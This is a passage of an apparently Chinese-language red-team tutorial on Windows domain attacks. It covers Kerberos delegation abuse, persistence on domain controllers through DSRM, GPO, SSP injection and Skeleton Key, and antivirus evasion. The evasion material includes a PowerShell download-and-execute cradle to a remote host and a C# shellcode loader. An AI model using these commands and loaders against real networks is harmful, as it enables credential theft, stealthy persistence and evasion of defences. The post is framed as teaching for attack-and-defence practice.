<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/4ace7c90105a501190a0d0d11da54fe0.png" alt="img" data-caption="img" loading="lazy"></p>
<p>win7机器即可获取所有用户hash：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/30a9a1bdef10a2d831ac71451c786601.png" alt="img" data-caption="img" loading="lazy"></p>
<p>发现非约束委派机器可以用如下命令：</p>
<p>查找域中配置非约束委派用户:</p>
<blockquote>
<p>Get-NetUser -Unconstrained -Domain jumbolab.com</p>
</blockquote>
<p>查找域中配置非约束委派的主机：</p>
<blockquote>
<p>Get-NetComputer -Unconstrained -Domain jumbolab.com</p>
</blockquote>
<h4 id="5-5-2-3-约束委派"><a href="#5-5-2-3-约束委派" class="headerlink" title="5.5.2.3 约束委派"></a>5.5.2.3 约束委派</h4><p>流程图如下：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/bf828b61d0261a01ff7ad61c39e9cbd1.png" alt="img" data-caption="img" loading="lazy"></p>
<p>利用过程如下：</p>
<p>存在服务用户，test，并设置约束委派：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/7647b5682d1045dfd684a5020a5bf550.png" alt="img" data-caption="img" loading="lazy"></p>
<p>服务账号可以为一个域用户设置spn即可:</p>
<blockquote>
<p>setspn.exe -U -A test/test test</p>
</blockquote>
<p>申请tgt：</p>
<blockquote>
<p>kekeo： tgt::ask /user:test /domain:jumbolab.com /password:aA123456</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/35fe337e77df084f52d0f3bff0ab1a66.png" alt="img" data-caption="img" loading="lazy"></p>
<p>利用生成的tgt申请st：</p>
<blockquote>
<p>kekeo： tgs::s4u /tgt:<a href="mailto:TGT_test@JUMBOLAB.COM_krbtgt">TGT_test@JUMBOLAB.COM_krbtgt</a>~<a href="mailto:jumbolab.com@JUMBOLAB.COM.kirbi">jumbolab.com@JUMBOLAB.COM.kirbi</a> /user:<a href="mailto:Administrator@jumbolab.com">Administrator@jumbolab.com</a> /service:cifs/dcserver.jumbolab.com</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/bbaab3a7a7c4daa10262819aad5aa130.png" alt="img" data-caption="img" loading="lazy"></p>
<p>导入st：</p>
<blockquote>
<p>mimikatz： kerberos::ptt <a href="mailto:TGS_Administrator@jumbolab.com">TGS_Administrator@jumbolab.com</a><a target="_blank" rel="noopener" href="https://github.com/JUMBOLAB">@JUMBOLAB</a>.COM_cifs~<a href="mailto:dcserver.jumbolab.com@JUMBOLAB.COM.kirbi">dcserver.jumbolab.com@JUMBOLAB.COM.kirbi</a></p>
</blockquote>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/42ecae73402b529a23d6d480f3b121f3.png" alt="img" data-caption="img" loading="lazy"></p>
<p>发现约束委派机器可以用如下命令：</p>
<p>查找域中配置约束委派用户:</p>
<blockquote>
<p>Get-DomainUser -TrustedToAuth -Domain jumbolab.com</p>
</blockquote>
<p>查找域中配置约束委派的主机：</p>
<blockquote>
<p>Get-DomainComputer -TrustedToAuth -Domain jumbolab.com</p>
</blockquote>
<h1 id="域维权"><a href="#域维权" class="headerlink" title="域维权"></a>域维权</h1><p>当拿下域控后，可以在域控上面做一些手脚，以保证后续的权限维持，甚至可以保证，就算域控密码改了，我们依然可以连接。</p>
<h2 id="6-1-DSRM"><a href="#6-1-DSRM" class="headerlink" title="6.1 DSRM"></a>6.1 DSRM</h2><p>该方法相当于重置了域控机器上的本地管理员密码。</p>
<p>DSRM，目录服务还原模式，是Windows服务器域控制器的安全模式启动选项。DSRM允许管理员用来修复或还原修复或重建活动目录数据库。DSRM账户实际上就是“Administrator”，也就是域控上面的本地管理员账号，非域管理员账号。当建立域控时，会让我们设置DSRM密码：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/991ff8fb17c92e08bcf22be18dadc061.png" alt="img" data-caption="img" loading="lazy"></p>
<p>我们用如下命令在域控上同步DSRM密码：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ntdsutilset DSRM passwordSYNC <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">DOMAIN</span> ACCOUNT usernameQQ<br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/8c63d44858acd8c772a45f9ec1743c22.png" alt="img" data-caption="img" loading="lazy"></p>
<p>即把DSRM重置成了和win7user用户一样的密码：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/95e505462f288f8f2a26bb58c48dc1c9.png" alt="img" data-caption="img" loading="lazy"></p>
<p>再在域控上添加注册表：</p>
<blockquote>
<p>reg add “ HKLM\System\CurrentControlSet\Control\Lsa” /v DSRMAdminLogonBehavior /t REG_DWORD /d 2</p>
</blockquote>
<p>最后用pth连接过去：</p>
<blockquote>
<p>sekurlsa::pth /domain:computername /user:Administrator /ntlm: b367819c0a8ccd792cad1d034f56a1fa</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/477af68cc3f8ed3e9e879a36829dc8d7.png" alt="img" data-caption="img" loading="lazy"></p>
<h2 id="6-2-GPO"><a href="#6-2-GPO" class="headerlink" title="6.2 GPO"></a>6.2 GPO</h2><p>当我们获取到管理员权限时，可以通过添加组策略手段，实现用户开机自启动。</p>
<p>域控上执行过程如下：</p>
<p>打开gpmc.msc ，编辑默认组策略：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/3bdf692800ff61c8f069e6f797d6935b.png" alt="img" data-caption="img" loading="lazy"></p>
<p>然后添加启动项：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/2b1777a225ead9cb33d90a824e648d79.png" alt="img" data-caption="img" loading="lazy"></p>
<p>并在对应的组策略目录下添加你的文件：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/e1856df8c53a91fff831940547629f54.png" alt="img" data-caption="img" loading="lazy"></p>
<p>再执行如下命令强制刷新组策略：</p>
<blockquote>
<p>gpupdate /force</p>
</blockquote>
<p>最终域内其他机器重启后就会执行对应的文件/脚本：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/205a6890bc6c505441a7f4f9ef78f7e7.png" alt="img" data-caption="img" loading="lazy"></p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/0734973bcd846034f1240557a0ae0394.png" alt="img" data-caption="img" loading="lazy"></p>
<h2 id="6-3-SSP"><a href="#6-3-SSP" class="headerlink" title="6.3 SSP"></a>6.3 SSP</h2><p>Security Support Provider理解为一个dll，用来实现身份认证；Security Support<br>Provider Interface理解为SSP的API，用于执行各种与安全相关的操作，如身份验证。</p>
<p>在系统启动的时候，SSP会被加载到lsass.exe中,也就是说我们可以自定义一个dll在系统启动时加载到lsass.exe中。</p>
<p>利用mimikatz：</p>
<p>1、将mimilib.dll复制到域控c:\windows\system32</p>
<p>2、添加注册表:<br>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages\</p>
<p>添加mimilib.dll</p>
<p>3、重启后记录登录的密码：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/a3a5981b6e1b6f8b377c69555b024797.png" alt="img" data-caption="img" loading="lazy"></p>
<p>也可以不重启,利用RPC加载SSP。</p>
<h2 id="6-4-Skeleton-Key"><a href="#6-4-Skeleton-Key" class="headerlink" title="6.4 Skeleton Key"></a>6.4 Skeleton Key</h2><p>利用mimikatz安装一个万能密码，“mimikatz”，实现代码可以参考如下：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_misc.c">https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_misc.c</a></p>
<blockquote>
<p>privilege::debug misc::skeleton</p>
</blockquote>
<p>当执行完上述命令后，就可以使用“mimikatz”作为一个万能密码，去连接域控，该方法可用于当域控密码被改掉时，我们依然可以去控制域控。</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/1ef9f623f64a79890881aa946b897686.png" alt="img" data-caption="img" loading="lazy"></p>
<h2 id="6-5-Hook-PasswordChangeNotify"><a href="#6-5-Hook-PasswordChangeNotify" class="headerlink" title="6.5 Hook PasswordChangeNotify"></a>6.5 Hook PasswordChangeNotify</h2><p>通过往lsass.exe进程中注入dll，达到通过Hook<br>PasswordChangeNotify拦截修改的帐户密码。该方法可用于拦截域内修改的密码。</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/Jumbo-WJB/Misc-Windows-Hacking">https://github.com/Jumbo-WJB/Misc-Windows-Hacking</a></p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/e35df74479df27c2d24801669c2c1769.png" alt="img" data-caption="img" loading="lazy"></p>
<h1 id="免杀处理"><a href="#免杀处理" class="headerlink" title="免杀处理"></a>免杀处理</h1><p>在上述的攻击利用中，出现了各种各样的工具，但是现在的edr都对上述工具、上述手法都做了安全防护，因此如何绕过av，又是一段漫长的路。</p>
<h2 id="7-1-Powershell绕过"><a href="#7-1-Powershell绕过" class="headerlink" title="7.1 Powershell绕过"></a>7.1 Powershell绕过</h2><p>以常见的cs上线生成的powershell为例。当使用默认ps命令时，会被直接拦截：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/b21c06a5528e9d82144a92e924e4dd01.png" alt="社交网站的手机截图 描述已自动生成" data-caption="社交网站的手机截图 描述已自动生成" loading="lazy"></p>
<p>我们先简单理解为拦截了这个命令，那就先简单尝试下加点特殊符号，而这个符号又不影响程序运行，比如“^”，但发现并不行：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/a0a2ee03c16ef5dc12aa5e7acc8ff089.png" alt="社交网站的手机截图 描述已自动生成" data-caption="社交网站的手机截图 描述已自动生成" loading="lazy"></p>
<p>那我们尝试把这个命令copy出来并换个名字试试呢？依然不行：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/f79a0eb65a64c4d5ea1b9f863a34548e.png" alt="手机屏幕截图 描述已自动生成" data-caption="手机屏幕截图 描述已自动生成" loading="lazy"></p>
<p>但是改成txt就成功了：</p>
<blockquote>
<p>jp.txt -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘<a target="_blank" rel="noopener" href="http://1.2.3.4/a">http://1.2.3.4:80/a</a>‘))”</p>
</blockquote>
<h2 id="7-2-抓密码工具免杀"><a href="#7-2-抓密码工具免杀" class="headerlink" title="7.2 抓密码工具免杀"></a>7.2 抓密码工具免杀</h2><p>渗透日常中密码抓取必不可少，当看到域控在线，工具被杀，想抓密码怎么办？</p>
<p>第一种，配合上面的powershell绕过执行ps1版的mimikatz：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/3453fa55fdb449e4511ea914a3958811.png" alt="img" data-caption="img" loading="lazy"></p>
<p>第二种，利用RPC加载SSP：</p>
<p><a target="_blank" rel="noopener" href="https://blog.xpnsec.com/exploring-mimikatz-part-2/">https://blog.xpnsec.com/exploring-mimikatz-part-2/</a></p>
<p>让lsass.exe自己dump 内存：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/6225c21dfc20dafda2d35cebd1dd2871.png" alt="社交网站的手机截图 描述已自动生成" data-caption="社交网站的手机截图 描述已自动生成" loading="lazy"></p>
<p>微软签名的procdump也可以：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/2f2ccaa982dd3960262521beb7693632.png" alt="img" data-caption="img" loading="lazy"></p>
<p>第三种，对工具本身做免杀，找个看起来无害化的工具：</p>
<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/sekurlsa-wdigest.cpp">https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/sekurlsa-wdigest.cpp</a></p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/44a7ff2fc53be252e027616f19bd234d.png" alt="手机屏幕截图 描述已自动生成" data-caption="手机屏幕截图 描述已自动生成" loading="lazy"></p>
<p>如果手上没有IDE编译环境或者没有源码怎么办？找个被杀的工具：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/0f4f5cd62787a7afd6713354c419ebaa.png" alt="手机屏幕截图 描述已自动生成" data-caption="手机屏幕截图 描述已自动生成" loading="lazy"></p>
<p>用restorator工具加个版本信息，成功免杀：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/18473f684fc59360c42e2b7a117c6af2.png" alt="img" data-caption="img" loading="lazy"></p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/e349c0bc04c85b68888060c81333f12e.png" alt="社交网络的手机截图 描述已自动生成" data-caption="社交网络的手机截图 描述已自动生成" loading="lazy"></p>
<h2 id="7-3-源码免杀"><a href="#7-3-源码免杀" class="headerlink" title="7.3 源码免杀"></a>7.3 源码免杀</h2><p>找个内存加载的源码，把shellcode加载执行。简单过程如下：</p>
<p>申请内存-&gt;写入shellcode-&gt;创建线程执行</p>
<p>先利用cs生成shellcode：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/38b0f3f2e0c9d7775bfc83a9991218d4.png" alt="img" data-caption="img" loading="lazy"></p>
<p>示例代码如下：</p>
<figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs capnproto"><span class="hljs-keyword">using</span> System;<span class="hljs-keyword">using</span> System.Runtime.InteropServices;namespace TCPMeterpreterProcess&#123;    class Program    &#123;        static void Main(string[] args)        &#123;            // native function’s compiled code            // generated <span class="hljs-keyword">with</span> metasploit            byte[] shellcode = new byte[<span class="hljs-number">835</span>] &#123;<span class="hljs-number">0</span>x........ &#125;;            <span class="hljs-built_in">UInt32</span> funcAddr = VirtualAlloc(<span class="hljs-number">0</span>, (<span class="hljs-built_in">UInt32</span>)shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);            Marshal.Copy(shellcode, <span class="hljs-number">0</span>, (IntPtr)(funcAddr), shellcode.Length);            IntPtr hThread = IntPtr.Zero;            <span class="hljs-built_in">UInt32</span> threadId = <span class="hljs-number">0</span>;            // prepare data            IntPtr pinfo = IntPtr.Zero;            // execute native code            hThread = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, funcAddr, pinfo, <span class="hljs-number">0</span>, ref threadId);            WaitForSingleObject(hThread, <span class="hljs-number">0</span>xFFFFFFFF);        &#125;        private static <span class="hljs-built_in">UInt32</span> MEM_COMMIT = <span class="hljs-number">0</span>x1000;        private static <span class="hljs-built_in">UInt32</span> PAGE_EXECUTE_READWRITE = <span class="hljs-number">0</span>x40;        [DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]        private static extern <span class="hljs-built_in">UInt32</span> VirtualAlloc(<span class="hljs-built_in">UInt32</span> lpStartAddr,        <span class="hljs-built_in">UInt32</span> size, <span class="hljs-built_in">UInt32</span> flAllocationType, <span class="hljs-built_in">UInt32</span> flProtect);        [DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]        private static extern bool VirtualFree(IntPtr lpAddress,        <span class="hljs-built_in">UInt32</span> dwSize, <span class="hljs-built_in">UInt32</span> dwFreeType);        [DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]        private static extern IntPtr CreateThread(        <span class="hljs-built_in">UInt32</span> lpThreadAttributes,        <span class="hljs-built_in">UInt32</span> dwStackSize,        <span class="hljs-built_in">UInt32</span> lpStartAddress,        IntPtr param,        <span class="hljs-built_in">UInt32</span> dwCreationFlags,        ref <span class="hljs-built_in">UInt32</span> lpThreadId        );        [DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]        private static extern bool CloseHandle(IntPtr handle);        [DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]        private static extern <span class="hljs-built_in">UInt32</span> WaitForSingleObject(        IntPtr hHandle,        <span class="hljs-built_in">UInt32</span> dwMilliseconds        );        [DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]        private static extern IntPtr GetModuleHandle(        string moduleName        );        [DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]        private static extern <span class="hljs-built_in">UInt32</span> GetProcAddress(        IntPtr hModule,        string procName        );        [DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]        private static extern <span class="hljs-built_in">UInt32</span> LoadLibrary(        string lpFileName        );        [DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]        private static extern <span class="hljs-built_in">UInt32</span> GetLastError();    &#125;&#125;<br></code></pre></td></tr></table></figure>
<p>编译后成功绕过杀毒软件:</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/37dbf3536f367870fcffe2c726ecf242.png" alt="手机屏幕截图 描述已自动生成" data-caption="手机屏幕截图 描述已自动生成" loading="lazy"></p>
<h2 id="7-4-白名单免杀"><a href="#7-4-白名单免杀" class="headerlink" title="7.4 白名单免杀"></a>7.4 白名单免杀</h2><p>我们可以使用windows自带的命令达到免杀的效果，比如：</p>
<p>msbuild：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/a9cd75e90291bf68fe80d06879680633.png" alt="img" data-caption="img" loading="lazy"></p>
<p>Wmic：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/8d77ff901eb5efa3574bd21258ff5245.png" alt="img" data-caption="img" loading="lazy"></p>
<p>这里收集了几个执行shellcode的常用白名单：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Jumbo-WJB/windows_exec_ways">https://github.com/Jumbo-WJB/windows_exec_ways</a></p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/e12a0c39e90daaea541de9196f514f94.png" alt="img" data-caption="img" loading="lazy"></p>
<p><strong>总结</strong></p>
<p>本文介绍了内网渗透的攻击手法和利用工具，也有绕过AV安全防护的突破手段。希望借此提高大家内网渗透攻击和防御水平。当然，不可能面面俱到，比如ACL配置不当造成的提权、mimikatz等工具的源码解读，还需要大家一起慢慢品味。</p>
<p>文中涉及的技术信息，只限用于技术交流，切勿用于非法用途。欢迎探讨交流，行文仓促，不足之处，敬请不吝批评指正。</p>
<p>最后感谢腾讯蓝军多位前辈同事的帮助和指导。同时预告一下，也算是立个flag：为了让红蓝对抗不用过于依靠个人经验和能力以及提升对抗效率，腾讯蓝军的红蓝对抗自动化工具平台正在筹建中，希望投入实战后有机会再跟大家一起交流学习。</p>
<p>附录：</p>
<p>部分工具地址：</p>
<p>Rubeus：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/GhostPack/Rubeus</a></p>
<p>PowerView：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
<p>Seatbelt：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/GhostPack/Seatbelt</a></p>
<p>Bloodhound：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/BloodHoundAD/BloodHound</a></p>
<p>Ruler：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/sensepost/ruler</a></p>
<p>MailSniper：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/dafthack/MailSniper</a></p>
<p>ReGeorg：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/sensepost/reGeorg</a></p>
<p>EarthWorm：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/rootkiter/EarthWorm</a></p>
<p>PowerCat：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/besimorhino/powercat</a></p>
<p>Mimikatz：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/gentilkiwi/mimikatz</a></p>
<p>Tgsrepcrack：<a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
<p>Kerbrute：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/ropnop/kerbrute</a></p>
<p>Responder：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p>

    
  </article>

  
      

  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
   
    
</div>

  
      <div class="nexmoe-post-footer">
          
      </div>
  
</div>
            <div class="nexmoe-post-right">
              <div class="nexmoe-fixed">
                  <div class="nexmoe-tool"> 
                    
                      
                        
                          
                          
                              <button class="mdui-fab catalog" style="overflow:unset;">
                                  <i class="nexmoefont icon-i-catalog"></i>
                                  <div class="nexmoe-toc">
                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8BWindows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.</span> <span class="toc-text">红蓝对抗之Windows内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-SPN"><span class="toc-number">1.2.</span> <span class="toc-text">1.1 SPN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E7%AB%AF%E5%8F%A3%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.3.</span> <span class="toc-text">1.2 端口连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.</span> <span class="toc-text">1.3 配置文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.</span> <span class="toc-text">1.4 用户信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-5-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.6.</span> <span class="toc-text">1.5 内网主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-6-%E4%BC%9A%E8%AF%9D%E6%94%B6%E9%9B%86"><span class="toc-number">1.7.</span> <span class="toc-text">1.6 会话收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-7-%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86"><span class="toc-number">1.8.</span> <span class="toc-text">1.7 凭据收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-8-DPAPI"><span class="toc-number">1.9.</span> <span class="toc-text">1.8 DPAPI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-9-%E5%9F%9F%E4%BF%A1%E4%BB%BB"><span class="toc-number">1.10.</span> <span class="toc-text">1.9 域信任</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-10-%E5%9F%9F%E4%BC%A0%E9%80%81"><span class="toc-number">1.11.</span> <span class="toc-text">1.10 域传送</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-11-DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96"><span class="toc-number">1.12.</span> <span class="toc-text">1.11 DNS记录获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-12-WIFI"><span class="toc-number">1.13.</span> <span class="toc-text">1.12 WIFI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-13-GPP"><span class="toc-number">1.14.</span> <span class="toc-text">1.13 GPP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-14-Seatbelt"><span class="toc-number">1.15.</span> <span class="toc-text">1.14 Seatbelt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-15-Bloodhound"><span class="toc-number">1.16.</span> <span class="toc-text">1.15 Bloodhound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-16-Exchange"><span class="toc-number">1.17.</span> <span class="toc-text">1.16 Exchange</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-16-1-%E9%82%AE%E7%AE%B1%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">1.17.1.</span> <span class="toc-text">1.16.1 邮箱用户密码爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-16-2-%E9%80%9A%E8%AE%AF%E5%BD%95%E6%94%B6%E9%9B%86"><span class="toc-number">1.17.2.</span> <span class="toc-text">1.16.2 通讯录收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-16-3-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.17.3.</span> <span class="toc-text">1.16.3 信息收集</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%A0%E8%BE%93%E9%80%9A%E9%81%93"><span class="toc-number">2.</span> <span class="toc-text">传输通道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E6%98%AF%E5%90%A6%E5%87%BA%E7%BD%91"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 是否出网</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-netsh"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 netsh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-ssh"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 ssh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-reGeorg"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 reGeorg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-EarthWorm"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 EarthWorm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-6-lcx"><span class="toc-number">2.6.</span> <span class="toc-text">2.6 lcx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-7-powercat"><span class="toc-number">2.7.</span> <span class="toc-text">2.7 powercat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-8-mssql"><span class="toc-number">2.8.</span> <span class="toc-text">2.8 mssql</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-UAC"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 UAC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-ms14-068"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 ms14-068</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96"><span class="toc-number">4.</span> <span class="toc-text">密码获取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-ntlmhash%E5%92%8Cnet-ntlmhash"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 ntlmhash和net-ntlmhash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 本地用户凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-%E5%9F%9Fhash"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 域hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-token%E7%AA%83%E5%8F%96"><span class="toc-number">4.4.</span> <span class="toc-text">4.4 token窃取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-5-Kerberoasting"><span class="toc-number">4.5.</span> <span class="toc-text">4.5 Kerberoasting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-6-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84"><span class="toc-number">4.6.</span> <span class="toc-text">4.6 密码喷射</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-7-LAPS"><span class="toc-number">4.7.</span> <span class="toc-text">4.7 LAPS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">5.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E8%BF%9E%E6%8E%A5"><span class="toc-number">5.1.</span> <span class="toc-text">5.1 账号密码连接</span></a></li><li class="toc-item toc-level-2"><a 